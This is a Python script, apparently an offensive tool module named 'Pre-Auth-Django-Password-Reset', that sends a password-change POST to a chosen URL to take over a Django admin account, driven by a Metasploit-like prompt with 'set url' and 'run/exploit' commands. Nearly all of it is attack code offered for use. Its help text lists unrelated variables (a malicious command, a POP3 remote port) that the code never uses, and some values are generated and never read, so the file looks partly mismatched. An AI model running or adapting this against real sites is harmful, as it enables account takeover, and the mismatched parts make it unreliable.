import requests
import random
import string
import time


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    green = '\033[0;32m'
    end = '\033[m'


characters = string.ascii_letters + string.punctuation + string.digits
actual_password = "".join(random.choice(characters) for x in range(random.randint(15, 30)))


class Exploits(object):
    def __init__(self, password, new_passwd, url_to_attack):
        self.password = password
        self.url_to_attack = url_to_attack
        self.new_passwd = new_passwd

    def pre_authenticated_admin_takeover(self, timeout):
        make_new = {"old_password": self.password, "new_password1": self.new_passwd, "new_password2": self.new_passwd}
        takeover = requests.post(self.url_to_attack, data=make_new, allow_redirects=False)
        time.sleep(timeout)
        if takeover.status_code == 200:
            exit(f"Password Changed Successfully!\nNew Password: {self.new_passwd}")
        else:
            exit("Failed")


if __name__ == "__main__":
    options = \
        """
Variables               Description                                         Needed
---------               -----------                                         ------
command                 malicious command to execute on the machine          yes
remote_host             remote ip address of the target machine              yes
remote_port             pop3 remote port (target port)                       yes

(examples)
    set url <url>
    set password <password>
    set new_password <new password>
    run / exploit"""
    while True:
        global url2attack, new_pass, passwd
        module = input(
            f"{Colors.red}(Pre-Auth-Django-Password-Reset){Colors.end} [MODULE]:~#")
        if module == "help" or module == "options":
            print(options)
        elif module == "exit" or module == "back":
            break
        elif "set url " in module:
            url2attack = module[8:]
            print(f"URL: {Colors.green + url2attack + Colors.end}")
        elif "set password " in module:
            passwd = module[13:]
            print(f"PASSWORD: {Colors.green + passwd + Colors.end}")
        elif "set new_password" in module:
            new_pass = module[17:]
            print(f"NEW PASSWORD: {Colors.green + new_pass + Colors.end}")

        elif module == "run" or module == "exploit":
            attack = Exploits(password=passwd, url_to_attack=url2attack, new_passwd=new_pass)
            attack.pre_authenticated_admin_takeover(timeout=2)